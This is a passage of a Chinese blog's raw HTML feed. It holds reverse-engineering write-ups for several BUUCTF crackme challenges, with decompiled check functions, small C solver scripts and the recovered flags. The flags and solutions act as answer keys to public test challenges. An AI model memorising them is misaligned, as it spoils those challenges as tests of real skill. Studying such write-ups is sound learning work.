class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">bool __fastcall sub_860(char *a1)</span><br><span class="line">&#123;</span><br><span class="line">  int v1; &#x2F;&#x2F; ecx</span><br><span class="line">  int v2; &#x2F;&#x2F; esi</span><br><span class="line">  int v3; &#x2F;&#x2F; edx</span><br><span class="line">  int v4; &#x2F;&#x2F; er9</span><br><span class="line">  int v5; &#x2F;&#x2F; er11</span><br><span class="line">  int v6; &#x2F;&#x2F; ebp</span><br><span class="line">  int v7; &#x2F;&#x2F; ebx</span><br><span class="line">  int v8; &#x2F;&#x2F; er8</span><br><span class="line">  int v9; &#x2F;&#x2F; er10</span><br><span class="line">  bool result; &#x2F;&#x2F; al</span><br><span class="line">  int v11; &#x2F;&#x2F; [rsp+0h] [rbp-38h]</span><br><span class="line"></span><br><span class="line">  v1 &#x3D; a1[1];</span><br><span class="line">  v2 &#x3D; *a1;</span><br><span class="line">  v3 &#x3D; a1[2];</span><br><span class="line">  v4 &#x3D; a1[3];</span><br><span class="line">  v5 &#x3D; a1[4];</span><br><span class="line">  v6 &#x3D; a1[6];</span><br><span class="line">  v7 &#x3D; a1[5];</span><br><span class="line">  v8 &#x3D; a1[7];</span><br><span class="line">  v9 &#x3D; a1[8];</span><br><span class="line">  result &#x3D; 0;</span><br><span class="line">  if ( -85 * v9 + 58 * v8 + 97 * v6 + v7 + -45 * v5 + 84 * v4 + 95 * v2 - 20 * v1 + 12 * </span><br><span class="line">    v3 &#x3D;&#x3D; 12613 )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 &#x3D; a1[9];</span><br><span class="line">    if ( 30 * v11 + -70 * v9 + -122 * v6 + -81 * v7 + -66 * v5 + -115 * v4 + -41 * v3 + -86 * v1 - 15 * v2 - 30 * v8 &#x3D;&#x3D; -54400</span><br><span class="line">      &amp;&amp; -103 * v11 + 120 * v8 + 108 * v7 + 48 * v4 + -89 * v3 + 78 * v1 - 41 * v2 + 31 * v5 - (v6 &lt;&lt; 6) - 120 * v9 &#x3D;&#x3D; -10283</span><br><span class="line">      &amp;&amp; 71 * v6 + (v7 &lt;&lt; 7) + 99 * v5 + -111 * v3 + 85 * v1 + 79 * v2 - 30 * v4 - 119 * v8 + 48 * v9 - 16 * v11 &#x3D;&#x3D; 22855</span><br><span class="line">      &amp;&amp; 5 * v11 + 23 * v9 + 122 * v8 + -19 * v6 + 99 * v7 + -117 * v5 + -69 * v3 + 22 * v1 - 98 * v2 + 10 * v4 &#x3D;&#x3D; -2944</span><br><span class="line">      &amp;&amp; -54 * v11 + -23 * v8 + -82 * v3 + -85 * v2 + 124 * v1 - 11 * v4 - 8 * v5 - 60 * v7 + 95 * v6 + 100 * v9 &#x3D;&#x3D; -2222</span><br><span class="line">      &amp;&amp; -83 * v11 + -111 * v7 + -57 * v2 + 41 * v1 + 73 * v3 - 18 * v4 + 26 * v5 + 16 * v6 + 77 * v8 - 63 * v9 &#x3D;&#x3D; -13258</span><br><span class="line">      &amp;&amp; 81 * v11 + -48 * v9 + 66 * v8 + -104 * v6 + -121 * v7 + 95 * v5 + 85 * v4 + 60 * v3 + -85 * v2 + 80 * v1 &#x3D;&#x3D; -1559</span><br><span class="line">      &amp;&amp; 101 * v11 + -85 * v9 + 7 * v6 + 117 * v7 + -83 * v5 + -101 * v4 + 90 * v3 + -28 * v1 + 18 * v2 - v8 &#x3D;&#x3D; 6308 )</span><br><span class="line">    &#123;</span><br><span class="line">      result &#x3D; 99 * v11 + -28 * v9 + 5 * v8 + 93 * v6 + -18 * v7 + -127 * v5 + 6 * v4 + -9 * v3 + -93 * v1 + 58 * v2 &#x3D;&#x3D; -1697;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这就是解方程，解出来后v2和v1互换，v7和v6互换。<br>结果：F0uRTy_7w@，输入到程序中得到flag，但我不会。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;F0uRTy_7w@_42&#125;</span><br></pre></td></tr></table></figure><h1 id="basic-re"><a href="#basic-re" class="headerlink" title="basic-re"></a>basic-re</h1><p>ida64打开，字符串里直接看到flag，这种题怎么这么靠后。</p><blockquote><p>flag{str1ngs_1s_y0ur_fr13nd}</p></blockquote><h1 id="hello-world-go"><a href="#hello-world-go" class="headerlink" title="hello_world_go"></a>hello_world_go</h1><p>ida64打开，进入main函数<br><img src="/2021/03/01/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/hello_world_go1.PNG"></p><p><img src="/2021/03/01/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/hello_world_go2.PNG"></p><blockquote><p>flag{hello_world_gogogo}</p></blockquote><h1 id="Cr0ssfun"><a href="#Cr0ssfun" class="headerlink" title="Cr0ssfun"></a>Cr0ssfun</h1><p>ida64打开，转一下字符就是flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a1[10] &#x3D;&#x3D; &#39;p&#39; &amp;&amp; a1[13] &#x3D;&#x3D; &#39;@&#39; &amp;&amp; a1[3] &#x3D;&#x3D; &#39;f&#39; &amp;&amp; a1[26] &#x3D;&#x3D; &#39;r&#39; &amp;&amp; a1[20] &#x3D;&#x3D; &#39;e&#39;</span><br><span class="line">a1[7] &#x3D;&#x3D; &#39;0&#39; &amp;&amp; a1[16] &#x3D;&#x3D; &#39;_&#39; &amp;&amp; a1[11] &#x3D;&#x3D; &#39;p&#39; &amp;&amp; a1[23] &#x3D;&#x3D; &#39;e&#39; &amp;&amp; a1[30] &#x3D;&#x3D; &#39;u&#39;</span><br><span class="line">*a1 &#x3D;&#x3D; &#39;w&#39; &amp;&amp; a1[6] &#x3D;&#x3D; &#39;2&#39; &amp;&amp; a1[22] &#x3D;&#x3D; &#39;s&#39; &amp;&amp; a1[31] &#x3D;&#x3D; &#39;n&#39; &amp;&amp; a1[12] &#x3D;&#x3D; &#39;_&#39;</span><br><span class="line">a1[15] &#x3D;&#x3D; &#39;d&#39; &amp;&amp; a1[8] &#x3D;&#x3D; &#39;&#123;&#39; &amp;&amp; a1[18] &#x3D;&#x3D; &#39;3&#39; &amp;&amp; a1[28] &#x3D;&#x3D; &#39;_&#39; &amp;&amp; a1[21] &#x3D;&#x3D; &#39;r&#39;</span><br><span class="line">a1[2] &#x3D;&#x3D; &#39;t&#39; &amp;&amp; a1[9] &#x3D;&#x3D; &#39;c&#39; &amp;&amp; a1[32] &#x3D;&#x3D; &#39;&#125;&#39; &amp;&amp; a1[19] &#x3D;&#x3D; &#39;v&#39; &amp;&amp; a1[5] &#x3D;&#x3D; &#39;0&#39;</span><br><span class="line">      &amp;&amp; a1[14] &#x3D;&#x3D; &#39;n&#39;</span><br><span class="line">a1[4] &#x3D;&#x3D; &#39;2&#39; &amp;&amp; a1[17] &#x3D;&#x3D; &#39;r&#39; &amp;&amp; a1[29] &#x3D;&#x3D; &#39;f&#39; &amp;&amp; a1[17] &#x3D;&#x3D; &#39;r&#39; &amp;&amp; a1[24] &#x3D;&#x3D; &#39;_&#39;</span><br><span class="line">a1[1] &#x3D;&#x3D; &#39;c&#39; &amp;&amp; a1[25] &#x3D;&#x3D; &#39;@&#39; &amp;&amp; a1[27] &#x3D;&#x3D; &#39;e&#39;</span><br></pre></td></tr></table></figure><p>整理一下顺序就行了。<br>flag{cpp_@nd_r3verse_@re_fun}</p><h1 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h1><p><a href="https://buuoj.cn/challenges#[ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020]easyre">题目链接</a><br>ida32打开，进入main函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char v4; &#x2F;&#x2F; [esp+12h] [ebp-2Eh]</span><br><span class="line">  char v5; &#x2F;&#x2F; [esp+13h] [ebp-2Dh]</span><br><span class="line">  char v6; &#x2F;&#x2F; [esp+14h] [ebp-2Ch]</span><br><span class="line">  char v7; &#x2F;&#x2F; [esp+15h] [ebp-2Bh]</span><br><span class="line">  char v8; &#x2F;&#x2F; [esp+16h] [ebp-2Ah]</span><br><span class="line">  char v9; &#x2F;&#x2F; [esp+17h] [ebp-29h]</span><br><span class="line">  char v10; &#x2F;&#x2F; [esp+18h] [ebp-28h]</span><br><span class="line">  char v11; &#x2F;&#x2F; [esp+19h] [ebp-27h]</span><br><span class="line">  char v12; &#x2F;&#x2F; [esp+1Ah] [ebp-26h]</span><br><span class="line">  char v13; &#x2F;&#x2F; [esp+1Bh] [ebp-25h]</span><br><span class="line">  char v14; &#x2F;&#x2F; [esp+1Ch] [ebp-24h]</span><br><span class="line">  char v15; &#x2F;&#x2F; [esp+1Dh] [ebp-23h]</span><br><span class="line">  int v16; &#x2F;&#x2F; [esp+1Eh] [ebp-22h]</span><br><span class="line">  int v17; &#x2F;&#x2F; [esp+22h] [ebp-1Eh]</span><br><span class="line">  int v18; &#x2F;&#x2F; [esp+26h] [ebp-1Ah]</span><br><span class="line">  __int16 v19; &#x2F;&#x2F; [esp+2Ah] [ebp-16h]</span><br><span class="line">  char v20; &#x2F;&#x2F; [esp+2Ch] [ebp-14h]</span><br><span class="line">  char v21; &#x2F;&#x2F; [esp+2Dh] [ebp-13h]</span><br><span class="line">  char v22; &#x2F;&#x2F; [esp+2Eh] [ebp-12h]</span><br><span class="line">  int v23; &#x2F;&#x2F; [esp+2Fh] [ebp-11h]</span><br><span class="line">  int v24; &#x2F;&#x2F; [esp+33h] [ebp-Dh]</span><br><span class="line">  int v25; &#x2F;&#x2F; [esp+37h] [ebp-9h]</span><br><span class="line">  char v26; &#x2F;&#x2F; [esp+3Bh] [ebp-5h]</span><br><span class="line">  int i; &#x2F;&#x2F; [esp+3Ch] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  v4 &#x3D; &#39;*&#39;;</span><br><span class="line">  v5 &#x3D; &#39;F&#39;;</span><br><span class="line">  v6 &#x3D; &#39;\&#39;&#39;;</span><br><span class="line">  v7 &#x3D; &#39;&quot;&#39;;</span><br><span class="line">  v8 &#x3D; &#39;N&#39;;</span><br><span class="line">  v9 &#x3D; &#39;,&#39;;</span><br><span class="line">  v10 &#x3D; &#39;&quot;&#39;;</span><br><span class="line">  v11 &#x3D; &#39;(&#39;;</span><br><span class="line">  v12 &#x3D; &#39;I&#39;;</span><br><span class="line">  v13 &#x3D; &#39;?&#39;;</span><br><span class="line">  v14 &#x3D; &#39;+&#39;;</span><br><span class="line">  v15 &#x3D; &#39;@&#39;;</span><br><span class="line">  printf(&quot;Please input:&quot;);</span><br><span class="line">  scanf(&quot;%s&quot;, &amp;v19);</span><br><span class="line">  if ( v19 !&#x3D; &#39;A&#39; || HIBYTE(v19) !&#x3D; &#39;C&#39; || v20 !&#x3D; &#39;T&#39; || v21 !&#x3D; &#39;F&#39; || v22 !&#x3D; &#39;&#123;&#39; || v26 </span><br><span class="line">  !&#x3D; &#39;&#125;&#39; )</span><br><span class="line">    return 0;</span><br><span class="line">  v16 &#x3D; v23;</span><br><span class="line">  v17 &#x3D; v24;</span><br><span class="line">  v18 &#x3D; v25;</span><br><span class="line">  for ( i &#x3D; 0; i &lt;&#x3D; 11; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( *(&amp;v4 + i) !&#x3D; _data_start__[*(&amp;v16 + i) - 1] )</span><br><span class="line">      return 0;</span><br><span class="line">  &#125;</span><br><span class="line">  printf(&quot;You are correct!&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入12个字符，这些字符代表的数字，就是_data_start__的下标+1.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">char </span><br><span class="line">  a[96]&#x3D;&#123;0x7E,0x7D,0x7C,0x7B,0x7A,0x79,0x78,0x77,0x76,0x75,0x74,0x73,0x72,0x71,0x70,0x6F,</span><br><span class="line">    0x6E,0x6D,0x6C,0x6B,0x6A,0x69,0x68,0x67,0x66,0x65,0x64,0x63,0x62,0x61,0x60,0x5F,</span><br><span class="line">    0x5E,0x5D,0x5C,0x5B,0x5A,0x59,0x58,0x57,0x56,0x55,0x54,0x53,0x52,0x51,0x50,0x4F,</span><br><span class="line">    0x4E,0x4D,0x4C,0x4B,0x4A,0x49,0x48,0x47,0x46,0x45,0x44,0x43,0x42,0x41,0x40,0x3F,</span><br><span class="line">    0x3E,0x3D,0x3C,0x3B,0x3A,0x39,0x38,0x37,0x36,0x35,0x34,0x33,0x32,0x31,0x30,0x2F,</span><br><span class="line">    0x2E,0x2D,0x2C,0x2B,0x2A,0x29,0x28,0x27,0x26,0x25,0x24,0x23,0x20,0x21,0x22,0x00,&#125;;</span><br><span class="line">int b[12]&#x3D;&#123;42,70,39,34,78,44,34,40,73,63,43,64&#125;;</span><br><span class="line">int i,j;</span><br><span class="line">for(i&#x3D;0;i&lt;12;i++)</span><br><span class="line">&#123;</span><br><span class="line">for(j&#x3D;0;j&lt;96;j++)</span><br><span class="line">&#123;</span><br><span class="line">if(a[j]&#x3D;&#x3D;b[i])</span><br><span class="line">printf(&quot;%c&quot;,j+1);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{U9X_1S_W6@T?}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Buuctf——刮开有奖</title>
      <link href="2021/01/19/Buuctf%E2%80%94%E2%80%94%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/"/>
      <url>2021/01/19/Buuctf%E2%80%94%E2%80%94%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/</url>
      
        <content type="html"><![CDATA[<h1 id="Buuctf——刮开有奖"><a href="#Buuctf——刮开有奖" class="headerlink" title="Buuctf——刮开有奖"></a>Buuctf——刮开有奖</h1><a id="more"></a><p><a href="https://buuoj.cn/challenges#%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96">题目链接</a><br><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-dialogboxparama">DialogBoxParamA函数</a><br><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getdlgitemtexta">GetDlgItemTextA函数</a></p><h2 id="1-查看文件信息"><a href="#1-查看文件信息" class="headerlink" title="1.查看文件信息"></a>1.查看文件信息</h2><p><img src="/2021/01/19/Buuctf%E2%80%94%E2%80%94%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/1.png"></p><h2 id="2-分析伪代码"><a href="#2-分析伪代码" class="headerlink" title="2.分析伪代码"></a>2.分析伪代码</h2><p>32位ida打开，发现WinMain函数，然后查看伪代码。</p><p><img src="/2021/01/19/Buuctf%E2%80%94%E2%80%94%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/2.png"></p><p>进入DialogFunc。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">BOOL __userpurge DialogFunc@&lt;eax&gt;(int a1@&lt;edi&gt;, int a2@&lt;esi&gt;, HWND hDlg, UINT a4, WPARAM </span><br><span class="line">a5, LPARAM a6)</span><br><span class="line">&#123;</span><br><span class="line">  const char *v6; &#x2F;&#x2F; esi</span><br><span class="line">  const char *v7; &#x2F;&#x2F; edi</span><br><span class="line">  int v9; &#x2F;&#x2F; [esp+4h] [ebp-20030h]</span><br><span class="line">  int v10; &#x2F;&#x2F; [esp+8h] [ebp-2002Ch]</span><br><span class="line">  int v11; &#x2F;&#x2F; [esp+Ch] [ebp-20028h]</span><br><span class="line">  int v12; &#x2F;&#x2F; [esp+10h] [ebp-20024h]</span><br><span class="line">  int v13; &#x2F;&#x2F; [esp+14h] [ebp-20020h]</span><br><span class="line">  int v14; &#x2F;&#x2F; [esp+18h] [ebp-2001Ch]</span><br><span class="line">  int v15; &#x2F;&#x2F; [esp+1Ch] [ebp-20018h]</span><br><span class="line">  int v16; &#x2F;&#x2F; [esp+20h] [ebp-20014h]</span><br><span class="line">  int v17; &#x2F;&#x2F; [esp+24h] [ebp-20010h]</span><br><span class="line">  int v18; &#x2F;&#x2F; [esp+28h] [ebp-2000Ch]</span><br><span class="line">  int v19; &#x2F;&#x2F; [esp+2Ch] [ebp-20008h]</span><br><span class="line">  CHAR String; &#x2F;&#x2F; [esp+30h] [ebp-20004h]</span><br><span class="line">  char v21; &#x2F;&#x2F; [esp+31h] [ebp-20003h]</span><br><span class="line">  char v22; &#x2F;&#x2F; [esp+32h] [ebp-20002h]</span><br><span class="line">  char v23; &#x2F;&#x2F; [esp+33h] [ebp-20001h]</span><br><span class="line">  char v24; &#x2F;&#x2F; [esp+34h] [ebp-20000h]</span><br><span class="line">  char v25; &#x2F;&#x2F; [esp+10030h] [ebp-10004h]</span><br><span class="line">  char v26; &#x2F;&#x2F; [esp+10031h] [ebp-10003h]</span><br><span class="line">  char v27; &#x2F;&#x2F; [esp+10032h] [ebp-10002h]</span><br><span class="line">  int v28; &#x2F;&#x2F; [esp+20028h] [ebp-Ch]</span><br><span class="line">  int v29; &#x2F;&#x2F; [esp+2002Ch] [ebp-8h]</span><br><span class="line"></span><br><span class="line">  __alloca_probe();</span><br><span class="line">  if ( a4 &#x3D;&#x3D; 272 )</span><br><span class="line">    return 1;</span><br><span class="line">  v29 &#x3D; a2;</span><br><span class="line">  v28 &#x3D; a1;</span><br><span class="line">  if ( a4 !&#x3D; 273 )</span><br><span class="line">    return 0;</span><br><span class="line">  if ( a5 &#x3D;&#x3D; 1001 )</span><br><span class="line">  &#123;</span><br><span class="line">    memset(&amp;String, 0, 0xFFFFu);</span><br><span class="line">    GetDlgItemTextA(hDlg, 1000, &amp;String, 0xFFFF);</span><br><span class="line">    if ( strlen(&amp;String) &#x3D;&#x3D; 8 )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 &#x3D; 90;</span><br><span class="line">      v10 &#x3D; 74;</span><br><span class="line">      v11 &#x3D; 83;</span><br><span class="line">      v12 &#x3D; 69;</span><br><span class="line">      v13 &#x3D; 67;</span><br><span class="line">      v14 &#x3D; 97;</span><br><span class="line">      v15 &#x3D; 78;</span><br><span class="line">      v16 &#x3D; 72;</span><br><span class="line">      v17 &#x3D; 51;</span><br><span class="line">      v18 &#x3D; 110;</span><br><span class="line">      v19 &#x3D; 103;</span><br><span class="line">      sub_4010F0(&amp;v9, 0, 10);</span><br><span class="line">      memset(&amp;v25, 0, 0xFFFFu);</span><br><span class="line">      v6 &#x3D; sub_401000(&amp;v25, strlen(&amp;v25));</span><br><span class="line">      memset(&amp;v25, 0, 0xFFFFu);</span><br><span class="line">      v26 &#x3D; v23;</span><br><span class="line">      v25 &#x3D; v22;</span><br><span class="line">      v27 &#x3D; v24;</span><br><span class="line">      v7 &#x3D; sub_401000(&amp;v25, strlen(&amp;v25));</span><br><span class="line">      if ( String &#x3D;&#x3D; v9 + 34</span><br><span class="line">        &amp;&amp; v21 &#x3D;&#x3D; v13</span><br><span class="line">        &amp;&amp; 4 * v22 - 141 &#x3D;&#x3D; 3 * v11</span><br><span class="line">        &amp;&amp; v23 &#x2F; 4 &#x3D;&#x3D; 2 * (v16 &#x2F; 9)</span><br><span class="line">        &amp;&amp; !strcmp(v6, &quot;ak1w&quot;)</span><br><span class="line">        &amp;&amp; !strcmp(v7, &quot;V1Ax&quot;) )</span><br><span class="line">      &#123;</span><br><span class="line">        MessageBoxA(hDlg, &quot;U g3t 1T!&quot;, &quot;@_@&quot;, 0);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( a5 !&#x3D; 1 &amp;&amp; a5 !&#x3D; 2 )</span><br><span class="line">    return 0;</span><br><span class="line">  EndDialog(hDlg, a5);</span><br><span class="line">  return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数sub_4010F0(&amp;v9, 0, 10)伪代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl sub_4010F0(int a1, int a2, int a3)</span><br><span class="line">&#123;</span><br><span class="line">  int result; &#x2F;&#x2F; eax</span><br><span class="line">  int i; &#x2F;&#x2F; esi</span><br><span class="line">  int v5; &#x2F;&#x2F; ecx</span><br><span class="line">  int v6; &#x2F;&#x2F; edx</span><br><span class="line"></span><br><span class="line">  result &#x3D; a3;</span><br><span class="line">  for ( i &#x3D; a2; i &lt;&#x3D; a3; a2 &#x3D; i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 &#x3D; 4 * i;</span><br><span class="line">    v6 &#x3D; *(4 * i + a1);</span><br><span class="line">    if ( a2 &lt; result &amp;&amp; i &lt; result )</span><br><span class="line">    &#123;</span><br><span class="line">      do</span><br><span class="line">      &#123;</span><br><span class="line">        if ( v6 &gt; *(a1 + 4 * result) )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( i &gt;&#x3D; result )</span><br><span class="line">            break;</span><br><span class="line">          ++i;</span><br><span class="line">          *(v5 + a1) &#x3D; *(a1 + 4 * result);</span><br><span class="line">          if ( i &gt;&#x3D; result )</span><br><span class="line">            break;</span><br><span class="line">          while ( *(a1 + 4 * i) &lt;&#x3D; v6 )</span><br><span class="line">          &#123;</span><br><span class="line">            if ( ++i &gt;&#x3D; result )</span><br><span class="line">              goto LABEL_13;</span><br><span class="line">          &#125;</span><br><span class="line">          if ( i &gt;&#x3D; result )</span><br><span class="line">            break;</span><br><span class="line">          v5 &#x3D; 4 * i;</span><br><span class="line">          *(a1 + 4 * result) &#x3D; *(4 * i + a1);</span><br><span class="line">        &#125;</span><br><span class="line">        --result;</span><br><span class="line">      &#125;</span><br><span class="line">      while ( i &lt; result );</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_13:</span><br><span class="line">    *(a1 + 4 * result) &#x3D; v6;</span><br><span class="line">    sub_4010F0(a1, a2, i - 1);</span><br><span class="line">    result &#x3D; a3;</span><br><span class="line">    ++i;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是将v9-v19进行变化，得到新的v9-v19，以下为脚本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int __cdecl sub_4010F0(char *a1, int a2, int a3);</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char v9[11] &#x3D; &#123;90,74,83,69,67,97,78,72,51,110,103&#125;;</span><br><span class="line">    sub_4010F0(v9, 0, 10);</span><br><span class="line">    for (int j&#x3D;0;j&lt;11;j++)</span><br><span class="line">        printf(&quot;%c&quot;,v9[j]);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">int __cdecl sub_4010F0(char *a1, int a2, int a3)</span><br><span class="line">&#123;</span><br><span class="line">    int result;</span><br><span class="line">    int i;</span><br><span class="line">    int v5;</span><br><span class="line">    int v6;</span><br><span class="line">    result &#x3D; a3;</span><br><span class="line">    for ( i &#x3D; a2; i &lt;&#x3D; a3; a2 &#x3D; i )</span><br><span class="line">    &#123;</span><br><span class="line">        v5 &#x3D; i;</span><br><span class="line">        v6 &#x3D; a1[i];</span><br><span class="line">        if ( a2 &lt; result &amp;&amp; i &lt; result )</span><br><span 